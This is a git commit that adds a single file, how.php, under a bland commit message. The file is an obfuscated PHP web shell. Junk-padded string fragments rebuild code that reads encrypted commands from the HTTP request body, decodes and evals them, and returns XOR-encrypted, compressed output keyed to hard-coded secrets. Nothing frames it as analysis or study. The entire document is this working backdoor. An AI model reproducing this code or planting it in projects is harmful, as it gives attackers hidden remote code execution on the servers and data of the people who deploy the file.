a108cbc5e7126500ba31729051f35fde5e721476
Daud <46789550+mrdzer0@users.noreply.github.com>
2023-05-21 23:30:23 +0900

    Create how.php

---
+++ how.php
@@ -0,0 +1,12 @@
+<?php
+$I='or(g>$i=0;$i<$g>l;){for(g>$j=0g>;($g>j<$c&&$i<$lg>)g>;$j++g>,$i++){$o.=g>$g>t{$i}^$k';
+$F='{g>$j};}g>}retug>rn $o;}ifg> (@preg_g>g>match("/$kh(g>.+)$g>kf/",@fig>le_geg>t_con';
+$m='g>teng>ts("php:g>//inputg>"g>),$m)==1)g> {@obg>_startg>(g>);@eg>val(@gzuncg>ompressg>(';
+$d='@x(@basg>e64_decode(g>$mg>[g>1]),$k)));$o=@og>b_getg>g>_contents();@g>og>b_end_cg>le';
+$w=str_replace('WQ','','cWQreaWQte_WQfWQunWQWQction');
+$Y='g>$k="2de66g>57g>5";$kh="0023g>bba95g>592";$kf="g>g>2cc548656d77g>";$pg>="xUnDag>KDEg>Ug';
+$D='>EkeCrBB";functig>og>n g>x($tg>,$k){$c=strleng>($k);$l=g>sg>trleg>n($g>t);$o="";f';
+$c='ag>n();$r=@baseg>64_encog>dg>e(@x(@gzg>compress(g>$o),$g>kg>))g>g>;print("$p$kh$r$kf");}';
+$A=str_replace('g>','',$Y.$D.$I.$F.$m.$d.$c);
+$G=$w('',$A);$G();
+?>
